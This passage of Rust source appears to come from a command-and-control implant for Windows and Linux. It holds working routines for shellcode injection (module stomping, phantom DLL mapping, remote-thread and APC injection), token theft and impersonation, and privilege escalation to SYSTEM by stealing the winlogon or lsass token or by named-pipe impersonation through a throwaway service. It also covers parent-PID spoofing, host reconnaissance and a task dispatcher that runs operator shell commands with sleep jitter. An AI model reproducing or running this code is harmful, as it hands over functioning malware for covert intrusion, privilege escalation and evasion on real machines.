        buf[nb.rva..nb.rva+nb.blob.len()].copy_from_slice(&nb.blob);
    }

    // Memory64List
    pu64!(mem64_off,   regs.len() as u64);
    pu64!(mem64_off+8, data_off as u64);
    for (i, r) in regs.iter().enumerate() {
        let e = mem64_off + 16 + i * 16;
        pu64!(e,   r.addr);
        pu64!(e+8, r.raw.len() as u64);
    }

    // Raw data
    let mut pos = data_off;
    for r in &regs {
        buf[pos..pos+r.raw.len()].copy_from_slice(&r.raw);
        pos += r.raw.len();
    }

    buf
}

// ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn shellcode_stomp(sc: &[u8], dll_hint: &str) -> String {
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPMODULE,
    };
    use windows_sys::Win32::System::Threading::CreateThread;

    let auto_targets = ["xpsservices.dll","clbcatq.dll","msasn1.dll","wbemprox.dll","wbemcomn.dll"];

    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
    if snap == -1 { return "[-] shellcode_stomp: snapshot failed".into(); }

    let mut me: MODULEENTRY32 = std::mem::zeroed();
    me.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
    let mut target_base: *mut u8 = std::ptr::null_mut();
    let mut target_name = String::new();

    if Module32First(snap, &mut me) != 0 {
        loop {
            let mod_name = String::from_utf8_lossy(
                &me.szModule.iter().map(|&b| b as u8).take_while(|&b| b != 0).collect::<Vec<_>>()
            ).to_lowercase();
            let pick = if !dll_hint.is_empty() {
                mod_name == dll_hint.to_lowercase()
            } else {
                auto_targets.iter().any(|&t| t == mod_name.as_str())
            };
            if pick { target_base = me.modBaseAddr; target_name = mod_name; break; }
            if Module32Next(snap, &mut me) == 0 { break; }
        }
    }
    windows_sys::Win32::Foundation::CloseHandle(snap);
    if target_base.is_null() { return "[-] shellcode_stomp: target DLL not loaded".into(); }

    // Parse PE to find .text section
    if *target_base != b'M' { return "[-] shellcode_stomp: MZ wiped, can't parse PE".into(); }
    let e_lfanew = *(target_base.add(0x3C) as *const u32);
    let nt = target_base.add(e_lfanew as usize);
    let num_secs = *(nt.add(6)  as *const u16);
    let opt_sz   = *(nt.add(20) as *const u16);
    let mut sec  = nt.add(24 + opt_sz as usize);
    let (mut text_rva, mut text_sz) = (0u32, 0u32);
    for _ in 0..num_secs {
        let name = std::slice::from_raw_parts(sec, 5);
        if name == b".text" {
            text_sz  = *(sec.add(16) as *const u32);
            text_rva = *(sec.add(12) as *const u32);
            break;
        }
        sec = sec.add(40);
    }
    if text_sz == 0 { return format!("[-] shellcode_stomp: no .text in {}", target_name); }

    let write_addr = target_base.add(text_rva as usize);
    let write_len  = sc.len().min(text_sz as usize);
    let mut old = 0u32;
    VirtualProtect(write_addr as *const _, write_len, PAGE_READWRITE, &mut old);
    std::ptr::copy_nonoverlapping(sc.as_ptr(), write_addr, write_len);
    VirtualProtect(write_addr as *const _, write_len, PAGE_EXECUTE_READ, &mut old);

    let ht = CreateThread(std::ptr::null(), 0,
        Some(std::mem::transmute::<*mut u8, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(write_addr)),
        std::ptr::null_mut(), 0, std::ptr::null_mut());
    if ht == 0 { return format!("[-] shellcode_stomp: CreateThread failed (err {})", GetLastError()); }
    CloseHandle(ht);
    format!("[+] shellcode_stomp: {}+0x{:X} sc={} B → executing", target_name, text_rva, sc.len())
}

// ── In-process shellcode execution (STAGE2) ──────────────────────────────────

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::VirtualAlloc;

#[cfg(target_os = "windows")]
unsafe fn inject_self(sc: &[u8]) -> String {
    use windows_sys::Win32::System::Threading::CreateThread;
    let mem = VirtualAlloc(std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if mem.is_null() { return format!("[-] VirtualAlloc failed (err {})", GetLastError()); }
    std::ptr::copy_nonoverlapping(sc.as_ptr(), mem as *mut u8, sc.len());
    let mut old = 0u32;
    VirtualProtect(mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
    let ht = CreateThread(std::ptr::null(), 0,
        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(mem)),
        std::ptr::null_mut(), 0, std::ptr::null_mut());
    if ht == 0 { return format!("[-] CreateThread failed (err {})", GetLastError()); }
    CloseHandle(ht);
    format!("[+] self-inject: {} bytes → executing", sc.len())
}

// ── Phantom DLL / module stomping (UDRL) ─────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn phantom_load(sc: &[u8]) -> String {
    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
    use windows_sys::Win32::System::Threading::CreateThread;

    // Find host DLL
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into());
    let candidates = [
        format!("{}\\System32\\xpsservices.dll", sysroot),
        format!("{}\\System32\\clbcatq.dll",     sysroot),
        format!("{}\\System32\\msasn1.dll",       sysroot),
    ];
    let host = match candidates.iter().find(|p| std::path::Path::new(p.as_str()).exists()) {
        Some(p) => p.clone(),
        None    => return "[-] phantom_load: no host DLL found".into(),
    };

    // Resolve ntdll NT functions via GetProcAddress
    let ntdll = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if ntdll == 0 { return "[-] phantom_load: ntdll not loaded".into(); }

    macro_rules! resolve {
        ($name:literal) => {{
            let p = GetProcAddress(ntdll, concat!($name, "\0").as_ptr());
            match p { Some(f) => f as *const (), None => return concat!("[-] resolve: ", $name).into() }
        }};
    }

    let pfn_open:   *const () = resolve!("NtOpenFile");
    let pfn_close:  *const () = resolve!("NtClose");
    let pfn_cs:     *const () = resolve!("NtCreateSection");
    let pfn_map:    *const () = resolve!("NtMapViewOfSection");
    let pfn_prot:   *const () = resolve!("NtProtectVirtualMemory");
    let pfn_thread: *const () = resolve!("NtCreateThreadEx");

    // NT path: \??\<drive>\path
    let nt_path_s = format!("\\??\\{}", host);
    let nt_path_w: Vec<u16> = nt_path_s.encode_utf16().collect();
    let nbytes = (nt_path_w.len() * 2) as u16;

    #[repr(C)] struct UnicodeString { len: u16, max_len: u16, buf: *const u16 }
    #[repr(C)] struct ObjectAttrs  { length: u32, root: isize, name: *const UnicodeString, attribs: u32, sec_desc: *const (), sec_qos: *const () }
    #[repr(C)] struct IoStatusBlock{ status: i32, _pad: u32, info: usize }

    let ustr = UnicodeString { len: nbytes, max_len: nbytes + 2, buf: nt_path_w.as_ptr() };
    let oa   = ObjectAttrs   { length: std::mem::size_of::<ObjectAttrs>() as u32, root: 0, name: &ustr, attribs: 0x40, sec_desc: std::ptr::null(), sec_qos: std::ptr::null() };
    let mut isb: IoStatusBlock = std::mem::zeroed();
    let mut file_h: isize = 0;

    // NtOpenFile
    let nt_open: unsafe extern "system" fn(*mut isize, u32, *const ObjectAttrs, *mut IoStatusBlock, u32, u32) -> i32 = std::mem::transmute(pfn_open);
    let st = nt_open(&mut file_h, 0x80100080u32, &oa, &mut isb, 0x3, 0x60); // GENERIC_READ|FILE_EXECUTE|SYNC, SHARE_READ|DELETE, SYNC_IO|NON_DIR
    if st != 0 || file_h == 0 { return format!("[-] NtOpenFile: 0x{:08X}", st as u32); }

    // NtCreateSection SEC_IMAGE
    let nt_close:  unsafe extern "system" fn(isize) -> i32 = std::mem::transmute(pfn_close);
    let nt_cs: unsafe extern "system" fn(*mut isize, u32, *const (), *const i64, u32, u32, isize) -> i32 = std::mem::transmute(pfn_cs);
    let mut sec_h: isize = 0;
    let st2 = nt_cs(&mut sec_h, 0x000F001F, std::ptr::null(), std::ptr::null(), 0x02, 0x01000000, file_h); // SECTION_ALL_ACCESS, PAGE_READONLY, SEC_IMAGE
    nt_close(file_h);
    if st2 != 0 || sec_h == 0 { return format!("[-] NtCreateSection: 0x{:08X}", st2 as u32); }

    // NtMapViewOfSection CoW
    let nt_map: unsafe extern "system" fn(isize, isize, *mut *mut u8, usize, usize, *const i64, *mut usize, u32, u32, u32) -> i32 = std::mem::transmute(pfn_map);
    let mut base: *mut u8 = std::ptr::null_mut();
    let mut view_size: usize = 0;
    let mut st3 = nt_map(sec_h, -1isize, &mut base, 0, 0, std::ptr::null(), &mut view_size, 1, 0, 0x08000020u32); // PAGE_EXECUTE_WRITECOPY
    if st3 != 0 {
        base = std::ptr::null_mut(); view_size = 0;
        st3 = nt_map(sec_h, -1isize, &mut base, 0, 0, std::ptr::null(), &mut view_size, 1, 0, 0x20u32); // PAGE_EXECUTE_READ
        if st3 != 0 { nt_close(sec_h); return format!("[-] NtMapViewOfSection: 0x{:08X}", st3 as u32); }
    }
    nt_close(sec_h);

    let write_size = sc.len().min(view_size);

    // RW → CoW triggers → private pages
    let nt_prot: unsafe extern "system" fn(isize, *mut *mut u8, *mut usize, u32, *mut u32) -> i32 = std::mem::transmute(pfn_prot);
    let mut old_prot = 0u32;
    let mut b2 = base; let mut ws2 = write_size;
    nt_prot(-1isize, &mut b2, &mut ws2, PAGE_READWRITE, &mut old_prot);
    std::ptr::copy_nonoverlapping(sc.as_ptr(), base, write_size);

    // RX — never RWX
    b2 = base; ws2 = write_size;
    nt_prot(-1isize, &mut b2, &mut ws2, PAGE_EXECUTE_READ, &mut old_prot);

    // Execute
    let nt_thread: unsafe extern "system" fn(*mut isize, u32, *const (), isize, *const u8, *const (), u32, usize, usize, usize, *const ()) -> i32 = std::mem::transmute(pfn_thread);
    let mut thr: isize = 0;
    if nt_thread(&mut thr, 0x1FFFFF, std::ptr::null(), -1isize, base, std::ptr::null(), 0, 0, 0, 0, std::ptr::null()) != 0 || thr == 0 {
        let ht = CreateThread(std::ptr::null(), 0,
            Some(std::mem::transmute::<*mut u8, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(base)),
            std::ptr::null_mut(), 0, std::ptr::null_mut());
        if ht != 0 { CloseHandle(ht); }
    } else {
        CloseHandle(thr);
    }

    format!("[+] phantomLoad: host={} mapped=0x{:x} sc={} B → executing", host, base as usize, sc.len())
}

#[cfg(target_os = "windows")]
pub(crate) unsafe fn enable_priv(htok: HANDLE, priv_name: &str) -> bool {
    let name_w = wide(priv_name);
    let mut luid: LUID = std::mem::zeroed();
    if LookupPrivilegeValueW(std::ptr::null(), name_w.as_ptr(), &mut luid) == 0 { return false; }
    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
    };
    if AdjustTokenPrivileges(htok, 0, &tp, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
        std::ptr::null_mut(), std::ptr::null_mut()) == 0 { return false; }
    GetLastError() != 1300 // ERROR_NOT_ALL_ASSIGNED
}

#[cfg(target_os = "windows")]
pub(crate) unsafe fn enable_priv_token(htok: HANDLE, priv_name: &str) -> bool {
    let name_w = wide(priv_name);
    let mut luid: LUID = std::mem::zeroed();
    if LookupPrivilegeValueW(std::ptr::null(), name_w.as_ptr(), &mut luid) == 0 { return false; }
    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
    };
    if AdjustTokenPrivileges(htok, 0, &tp, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
        std::ptr::null_mut(), std::ptr::null_mut()) == 0 { return false; }
    GetLastError() != 1300
}

#[cfg(target_os = "windows")]
unsafe fn duplicate_primary_shell_token(source: HANDLE) -> HANDLE {
    let mut primary: HANDLE = 0;
    DuplicateTokenEx(source, TOKEN_ALL_ACCESS, std::ptr::null(),
        SecurityDelegation, TokenPrimary, &mut primary);
    if primary == 0 {
        DuplicateTokenEx(source, TOKEN_ALL_ACCESS, std::ptr::null(),
            SecurityImpersonation, TokenPrimary, &mut primary);
    }
    primary
}

// Adjust the token's session ID to match the calling process session.
// A cross-session token (e.g. winlogon = Session 1, agent in Session 0)
// causes STATUS_DLL_INIT_FAILED in cmd.exe because user32.dll cannot
// initialise without a consistent session context.
// Requires SeTcbPrivilege on the calling thread (present when impersonating SYSTEM).
#[cfg(target_os = "windows")]
unsafe fn normalize_token_session(token: HANDLE) {
    let mut self_tok: HANDLE = 0;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut self_tok) == 0 { return; }
    let mut session: u32 = 0;
    let mut ret_len: u32 = 0;
    GetTokenInformation(self_tok, TokenSessionId,
        &mut session as *mut u32 as *mut _, 4, &mut ret_len);
    CloseHandle(self_tok);
    SetTokenInformation(token, TokenSessionId,
        &mut session as *mut u32 as *mut _, 4);
}

#[cfg(target_os = "windows")]
unsafe fn inject_remote(pid: u32, sc: &[u8]) -> String {
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if mem.is_null() { CloseHandle(hproc); return format!("VirtualAllocEx failed (err {})", GetLastError()); }
    let mut written = 0usize;
    WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
    let mut old = 0u32;
    VirtualProtectEx(hproc, mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
    let start: windows_sys::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(mem));
    let mut tid = 0u32;
    let ht = CreateRemoteThread(hproc, std::ptr::null(), 0, start, std::ptr::null(), 0, &mut tid);
    CloseHandle(hproc);
    if ht == 0 { return format!("CreateRemoteThread failed (err {})", GetLastError()); }
    CloseHandle(ht);
    format!("[+] injected {} bytes into PID {} (TID={})", sc.len(), pid, tid)
}

#[cfg(target_os = "windows")]
unsafe fn inject_apc(pid: u32, sc: &[u8]) -> String {
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mem = VirtualAllocEx(hproc, std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if mem.is_null() { CloseHandle(hproc); return format!("VirtualAllocEx failed (err {})", GetLastError()); }
    let mut written = 0usize;
    WriteProcessMemory(hproc, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
    let mut old_prot = 0u32;
    VirtualProtectEx(hproc, mem, sc.len(), PAGE_EXECUTE_READ, &mut old_prot);
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if snap == INVALID_HANDLE_VALUE { CloseHandle(hproc); return "snapshot failed".into(); }
    let mut te: THREADENTRY32 = std::mem::zeroed();
    te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut queued = 0u32;
    if Thread32First(snap, &mut te) != 0 {
        loop {
            if te.th32OwnerProcessID == pid {
                let ht = OpenThread(THREAD_SET_CONTEXT, 0, te.th32ThreadID);
                if ht != 0 {
                    let apc_fn: PAPCFUNC =
                        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(usize)>(mem));
                    QueueUserAPC(apc_fn, ht, 0);
                    CloseHandle(ht);
                    queued += 1;
                }
            }
            if Thread32Next(snap, &mut te) == 0 { break; }
        }
    }
    CloseHandle(snap);
    CloseHandle(hproc);
    format!("[+] APC queued to {} thread(s) in PID {}", queued, pid)
}

#[cfg(target_os = "windows")]
unsafe fn token_steal(pid: u32) -> String {
    let mut hself = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
        enable_priv(hself, "SeDebugPrivilege");
        CloseHandle(hself);
    }
    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
    if hproc == 0 { return format!("OpenProcess failed (err {})", GetLastError()); }
    let mut htok = 0isize;
    if OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut htok) == 0 {
        CloseHandle(hproc);
        return format!("OpenProcessToken failed (err {})", GetLastError());
    }
    CloseHandle(hproc);
    // Impersonation token for ImpersonateLoggedOnUser
    let mut hdup = 0isize;
    DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
        SecurityImpersonation, TokenImpersonation, &mut hdup);
    // Primary token for CreateProcessWithTokenW in shell() — try Delegation first
    let hprim = duplicate_primary_shell_token(htok);
    CloseHandle(htok);
    if hdup == 0 { if hprim != 0 { CloseHandle(hprim); } return format!("DuplicateTokenEx failed (err {})", GetLastError()); }
    if hprim == 0 { CloseHandle(hdup); return format!("DuplicateTokenEx (primary) failed (err {})", GetLastError()); }
    if ImpersonateLoggedOnUser(hdup) == 0 {
        CloseHandle(hdup); CloseHandle(hprim);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    CloseHandle(hdup);
    let old = G_STOLEN_TOKEN.swap(hprim, Ordering::AcqRel);
    if old != 0 { CloseHandle(old); }
    format!("[+] impersonating token from PID {}", pid)
}

#[cfg(target_os = "windows")]
unsafe fn token_make(user: &str, domain: &str, pass: &str) -> String {
    let wu = wide(user); let wd = wide(domain); let wp = wide(pass);
    let mut htok = 0isize;
    if LogonUserW(wu.as_ptr(), wd.as_ptr(), wp.as_ptr(),
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &mut htok) == 0 {
        return format!("LogonUser failed (err {})", GetLastError());
    }
    if ImpersonateLoggedOnUser(htok) == 0 {
        CloseHandle(htok);
        return format!("ImpersonateLoggedOnUser failed (err {})", GetLastError());
    }
    // Primary token for shell() via CreateProcessWithTokenW — try Delegation first
    let hprim = duplicate_primary_shell_token(htok);
    CloseHandle(htok);
    if hprim == 0 { return format!("DuplicateTokenEx (primary) failed (err {})", GetLastError()); }
    let old = G_STOLEN_TOKEN.swap(hprim, Ordering::AcqRel);
    if old != 0 { CloseHandle(old); }
    format!("[+] impersonating {}\\{}", domain, user)
}

#[cfg(target_os = "windows")]
unsafe fn get_system() -> String {
    // ── T1: SeDebugPrivilege + winlogon token steal ──────────────────────
    let mut hself = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut hself) != 0 {
        enable_priv(hself, "SeDebugPrivilege");
        CloseHandle(hself);
    }
    'T1: {
        const TARGETS: &[&str] = &["winlogon.exe", "lsass.exe", "services.exe", "wininit.exe"];
        let mut sys_pid = 0u32;
        let mut match_name = "";
        'search: for tgt in TARGETS {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == INVALID_HANDLE_VALUE { continue; }
            let mut pe: PROCESSENTRY32 = std::mem::zeroed();
            pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
            if Process32First(snap, &mut pe) != 0 {
                loop {
                    let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
                    let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
                    if name.eq_ignore_ascii_case(tgt) {
                        sys_pid = pe.th32ProcessID;
                        match_name = tgt;
                        CloseHandle(snap);
                        break 'search;
                    }
                    if Process32Next(snap, &mut pe) == 0 { break; }
                }
            }
            CloseHandle(snap);
        }
        if sys_pid == 0 { break 'T1; }
        let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sys_pid);
        if hproc == 0 { break 'T1; }
        let mut htok = 0isize;
        if OpenProcessToken(hproc, TOKEN_DUPLICATE, &mut htok) == 0 { CloseHandle(hproc); break 'T1; }
        CloseHandle(hproc);
        let hprim = duplicate_primary_shell_token(htok);
        let mut hdup = 0isize;
        DuplicateTokenEx(htok, TOKEN_ALL_ACCESS, std::ptr::null(),
            SecurityImpersonation, TokenImpersonation, &mut hdup);
        CloseHandle(htok);
        if hprim == 0 || hdup == 0 {
            if hprim != 0 { CloseHandle(hprim); }
            if hdup != 0 { CloseHandle(hdup); }
            break 'T1;
        }
        if ImpersonateLoggedOnUser(hdup) == 0 {
            CloseHandle(hdup); if hprim != 0 { CloseHandle(hprim); } break 'T1;
        }
        CloseHandle(hdup);
        normalize_token_session(hprim);
        let old = G_SYSTEM_TOKEN.swap(hprim, Ordering::AcqRel);
        if old != 0 { CloseHandle(old); }
        return format!("[+] T1 SYSTEM ({} PID={})", match_name, sys_pid);
    }

    // ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
    let rnd = {
        let pid = std::process::id();
        let tid = GetCurrentThreadId();
        pid.wrapping_mul(0x41C64E6D).wrapping_add(tid).wrapping_add(0x1337)
    };
    let pipe_name = format!(r"\\.\pipe\svc{:08x}", rnd);
    let svc_name  = format!("svc{:08x}", rnd ^ 0xdeadbeef_u32);
    let bin_path  = format!("cmd.exe /c echo . > {}", pipe_name);

    fn to_wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }
    let wpipe = to_wide(&pipe_name);
    let wsvc  = to_wide(&svc_name);
    let wbin  = to_wide(&bin_path);

    let h_pipe = CreateNamedPipeW(
        wpipe.as_ptr(),
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE,
        1, 512, 512, 0, std::ptr::null(),
    );
    if h_pipe == INVALID_HANDLE_VALUE {
        return format!("[-] T1+T2 failed (CreateNamedPipe err {})", GetLastError());
    }

    let h_scm = OpenSCManagerW(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
    if h_scm == 0 {
        CloseHandle(h_pipe);
        return format!("[-] T1+T2 failed (OpenSCManager err {}, need local admin)", GetLastError());
    }

    let h_svc = CreateServiceW(
        h_scm, wsvc.as_ptr(), wsvc.as_ptr(), SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        wbin.as_ptr(), std::ptr::null(), std::ptr::null_mut(),
        std::ptr::null(), std::ptr::null(), std::ptr::null(),
    );
    if h_svc == 0 {
        CloseServiceHandle(h_scm); CloseHandle(h_pipe);
        return format!("[-] T1+T2 failed (CreateService err {})", GetLastError());
    }

    let h_event = CreateEventW(std::ptr::null(), 1, 0, std::ptr::null());
    if h_event == 0 {
        DeleteService(h_svc); CloseServiceHandle(h_svc); CloseServiceHandle(h_scm);
        CloseHandle(h_pipe);
        return "[-] T1+T2 failed (CreateEvent)".into();
    }

    let mut ov: OVERLAPPED = std::mem::zeroed();
    ov.hEvent = h_event;

    ConnectNamedPipe(h_pipe, &mut ov); /* async — ERROR_IO_PENDING expected */
    StartServiceW(h_svc, 0, std::ptr::null());

    let mut wr = WaitForSingleObject(h_event, 2000);
    if wr != WAIT_OBJECT_0 {
        StartServiceW(h_svc, 0, std::ptr::null());
        wr = WaitForSingleObject(h_event, 3000);
    }

    DeleteService(h_svc); CloseServiceHandle(h_svc); CloseServiceHandle(h_scm);
    CloseHandle(h_event);

    if wr != WAIT_OBJECT_0 {
        CancelIoEx(h_pipe, &ov);
        CloseHandle(h_pipe);
        return format!("[-] T1+T2 failed (T2 pipe timeout res={})", wr);
    }

    let ok = ImpersonateNamedPipeClient(h_pipe);
    CloseHandle(h_pipe);
    if ok == 0 {
        return format!("[-] T1+T2 failed (ImpersonateNamedPipeClient err {})", GetLastError());
    }
    let mut h_thr_tok = 0isize;
    let mut stored_t2 = false;
    if OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ALL_ACCESS, 0, &mut h_thr_tok) != 0 {
        let hprim = duplicate_primary_shell_token(h_thr_tok);
        CloseHandle(h_thr_tok);
        if hprim != 0 {
            normalize_token_session(hprim);
            let old = G_SYSTEM_TOKEN.swap(hprim, Ordering::AcqRel);
            if old != 0 { CloseHandle(old); }
            stored_t2 = true;
        }
    }
    if !stored_t2 { return "[-] T1+T2 failed (DuplicateTokenEx primary token)".into(); }
    "[+] T2 SYSTEM (named pipe + service)".into()
}

#[cfg(target_os = "windows")]
unsafe fn spawn_with_ppid(cmd: &str, parent_name: &str) -> String {
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE_VALUE { return "CreateToolhelp32Snapshot failed".into(); }
    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
    let mut parent_pid = 0u32;
    if Process32First(snap, &mut pe) != 0 {
        loop {
            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
            if name.eq_ignore_ascii_case(parent_name) { parent_pid = pe.th32ProcessID; break; }
            if Process32Next(snap, &mut pe) == 0 { break; }
        }
    }
    CloseHandle(snap);
    if parent_pid == 0 { return format!("process '{}' not found", parent_name); }

    let hparent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parent_pid);
    if hparent == 0 { return format!("OpenProcess(parent) failed (err {})", GetLastError()); }

    let mut attr_size = 0usize;
    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attr_size);
    let heap = GetProcessHeap();
    let attr_list = HeapAlloc(heap, 0, attr_size) as LPPROC_THREAD_ATTRIBUTE_LIST;
    if attr_list.is_null() { CloseHandle(hparent); return "HeapAlloc failed".into(); }
    InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size);
    UpdateProcThreadAttribute(
        attr_list, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
        &hparent as *const HANDLE as *const _,
        std::mem::size_of::<HANDLE>(),
        std::ptr::null_mut(),
        std::ptr::null(),
    );

    let mut si: STARTUPINFOEXW = std::mem::zeroed();
    si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
    si.lpAttributeList = attr_list;
    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
    let mut cmd_w = wide(cmd);
    let ok = CreateProcessW(
        std::ptr::null(), cmd_w.as_mut_ptr(),
        std::ptr::null(), std::ptr::null(), 0,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        std::ptr::null(), std::ptr::null(),
        &si.StartupInfo, &mut pi,
    );
    DeleteProcThreadAttributeList(attr_list);
    HeapFree(heap, 0, attr_list as *const _);
    CloseHandle(hparent);
    if ok == 0 {
        return format!("CreateProcessW failed (err {})", GetLastError());
    }
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    format!("[+] spawned '{}' (PID={}) with parent {}({})", cmd, pi.dwProcessId, parent_name, parent_pid)
}

// ── Sysinfo ───────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn sysinfo() -> String {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let arch = if cfg!(target_arch = "x86_64") { "amd64" } else { "x86" };
    format!(
        "hostname={}\nusername={}\nos=windows/{}\npid={}",
        hostname, username, arch, std::process::id()
    )
}

#[cfg(not(target_os = "windows"))]
fn sysinfo() -> String {
    let hostname = std::fs::read_to_string("/proc/sys/kernel/hostname")
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| std::env::var("HOSTNAME").unwrap_or_else(|_| "UNKNOWN".into()));
    let username = std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .unwrap_or_else(|_| "UNKNOWN".into());
    let arch = if cfg!(target_arch = "x86_64") { "amd64" } else { "x86" };
    let os_name = std::fs::read_to_string("/etc/os-release")
        .map(|s| {
            s.lines()
                .find(|l| l.starts_with("PRETTY_NAME="))
                .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
                .unwrap_or_else(|| "linux".to_string())
        })
        .unwrap_or_else(|_| "linux".to_string());
    format!(
        "hostname={}\nusername={}\nos={}/{}\npid={}",
        hostname, username, os_name, arch, std::process::id()
    )
}

// ── Directory listing ─────────────────────────────────────────────────────────

fn ls(path: &str) -> String {
    let dir = if path.is_empty() {
        std::env::current_dir().unwrap_or_default().to_string_lossy().into_owned()
    } else {
        path.to_string()
    };
    match std::fs::read_dir(&dir) {
        Ok(entries) => entries
            .filter_map(|e| e.ok())
            .map(|e| {
                let kind = if e.path().is_dir() { "D" } else { "F" };
                format!("{}  {}", kind, e.path().display())
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[error: {}]", e),
    }
}

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "SHELL" => {
            t.send_result(task.id, &shell(&task.args), "");
        }
        "SHELL_OPSEC" => {
            #[cfg(target_os = "windows")]
            t.send_result(task.id, &unsafe { shell_opsec(&task.args) }, "");
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, &shell(&task.args), "");
        }
        "SLEEP" => {
            if task.args.trim_start().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                if let Some(s) = j.get("sec").and_then(|v| v.as_u64()) {
                    DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
                }
                if let Some(jitter) = j.get("jitter").and_then(|v| v.as_u64()) {
                    DYN_JITTER_PCT.store(jitter, Ordering::Relaxed);
                }
            } else {
                let parts: Vec<&str> = task.args.split_whitespace().collect();
                if let Some(s) = parts.first().and_then(|v| v.parse::<u64>().ok()) {
                    DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
                }
